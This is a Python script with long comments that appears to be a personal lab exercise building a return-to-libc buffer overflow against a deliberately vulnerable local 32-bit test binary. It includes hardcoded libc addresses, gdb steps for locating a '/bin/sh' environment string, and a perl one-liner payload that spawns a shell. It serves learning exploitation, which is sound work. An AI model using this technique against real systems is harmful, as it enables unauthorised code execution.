#!/usr/bin/env python3
import os,struct

# no BOF canaries, stack NOT executable
# gcc -m32 -fno-stack-protector test.c -o test.elf



# Stage 4:  No stack protect, stack NOT executable; return to libc
## STAGE4="""
# The goal here is to call a function from libc executable memory, such as system() or execve().  RET addr should be addr of one of these.  Parameter on stack, should be pointer to null-terminated string "sh" or similar.
# executable /lib32/libc-2.27.so region start @ 0xf7dd4000
# readelf -s /lib32/libc-2.27.so |grep system
#    254: 00127190   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
#    652: 0003cd10    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
#   1510: 0003cd10    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
# print("0x%08x" % (0xf7dd4000 + 0x0003cd10))
# 0xf7e10d10 ## Apparently, by my calculations, system in /lib32/libc-2.27.so
## Of extreme discernment shoudl be the fact that we want to set up a fake frame pointer.
## According to https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf:
## Stack should look like: :
## *system, *return_addr_after_system_call, *arguments_to_system_call
## If you recall, when you call a function, first (I think EBP) EBP gets pushed onto the stack.  
# The document suggests setting an environment variable SHELL= and locating it's address, holding the parameter(s) to the function call
# Which is pointed out, can be done by loading the binary in gdb, x/500s $esp to print out 500 strings; locate the environment variable, and use that address for the arg to system()
# export TEMPO="/bin/bash"
# gdb ./test.elf
## Of distinction, addresses are different when starting with gdb;  better attach to running PID so you can get ACTUAL addresses when it's running.
# Also worth noting that the envars will have different addresses any time your calling of the executable changes, i.e., when it's a child process of some other process.
# break main
# run
# x/500s $esp
# 0xffffde8f:     "TEMPO=/bin/sh"
# p/x 0xffffde8f + 0x6
# $3 = 0xffffde95
# param=b"edb --run ./test.elf '"
param=b"./test.elf '"
param+=b"A"*30
param+=struct.pack("<L",0xf7e10d10) ## CRASH, pointer to system@@GLIBC_2.0()
param+=struct.pack("<L",0xf7e03f70) ## return to where(?) FROM system; exit()
# param+=struct.pack("<L",0xf7e91e90) ## pause(), so we can attach a debugger and examine
param+=struct.pack("<L",0x565556c9) ## "/bin/bash\0" (arg(s) to system() call)
param += b"'"
print(param)
input()
os.system(b"%s" % param)
#### FINAL NOTES
# The aim is to make it so ./test.elf can be run directly, and $(perl -e) the parameter, rather than starting it using this python script.  In order to do this, need to get the program to pause before exiting so I can get accurate addresses for the envars.  So, commented out the return to exit(), replaced with a call to pause().  changed the parameter to system() to an address that would intentionally fail.  Ran the script, causing it to print out the string as part of print(param).   Took the string, ran "./test.elf $(perl -e 'print "[string]"') to get the program running and paused.  Attached gdb to the running process to x/500s $esp examine the memory addresses for the $TEMPO envar.
# export TEMPO=/bin/sh
# ./test.elf $(perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\r\xe1\xf7\x90\x1e\xe9\xf7\x7f\xdf\xff\xff"')
# In a separate terminal:
# pgrep -fl test.elf
# gdb --pid 8907
# x/500s $esp
# 0xffffddf2:     "TEMPO=/bin/sh"
# (gdb) p/x 0xffffddf2 + 0x6
# $1 = 0xffffddf8  ## BOOM TOWN SON
## In retrospect, much easier if can just locate /bin/sh or /bin/bash string, null-terminated, in the running program, and use that address versus using the environment variable, because address much more reliable/static.
# """


